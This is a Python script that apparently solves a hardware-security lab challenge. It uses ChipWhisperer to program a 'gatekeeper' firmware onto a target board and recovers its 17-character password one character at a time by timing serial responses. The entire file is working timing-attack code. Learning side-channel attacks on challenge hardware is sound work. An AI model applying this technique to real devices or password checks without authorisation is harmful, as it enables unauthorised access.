import chipwhisperer as cw
import time
import statistics

CHARSET = 'abcdefghijklmnopqrstuvwxyz0123456789{}'
PWD_LEN = 17
SAMPLES = 15
FIRMWARE = '../../../challenges/set1/gatekeeper-CWNANO.hex'

def setup():
    scope = cw.scope()
    target = cw.target(scope, cw.targets.SimpleSerial)
    time.sleep(0.05)
    scope.default_setup()

    import os
    fw_path = os.path.abspath(FIRMWARE)
    prog = cw.programmers.STM32FProgrammer
    cw.program_target(scope, prog, fw_path)
    print("programming done")
    time.sleep(0.2)

    return scope, target

def measure_time(target, password):
    password_bytes = password.encode('ascii')
    start = time.perf_counter()
    target.simpleserial_write('b', password_bytes)
    response = target.simpleserial_read('r', 1)
    end = time.perf_counter()
    return end - start

def guess_character(target, current_password, position):
    timings = {}
    for char in CHARSET:
        pwd_try = (current_password + char).ljust(PWD_LEN, 'a')
        samples = []
        for _ in range(SAMPLES):
            t = measure_time(target, pwd_try)
            samples.append(t)
            time.sleep(0.01)
        median_time = statistics.median(samples)
        timings[char] = median_time

    best_char = max(timings, key=timings.get)
    print(f"position {position}: guessed '{best_char}'")
    return best_char

def main():
    scope, target = setup()
    found_password = ""

    for pos in range(0, PWD_LEN):
        next_char = guess_character(target, found_password, pos)
        found_password += next_char

    print(f"guessed password: {found_password}")

if __name__ == '__main__':
    main()
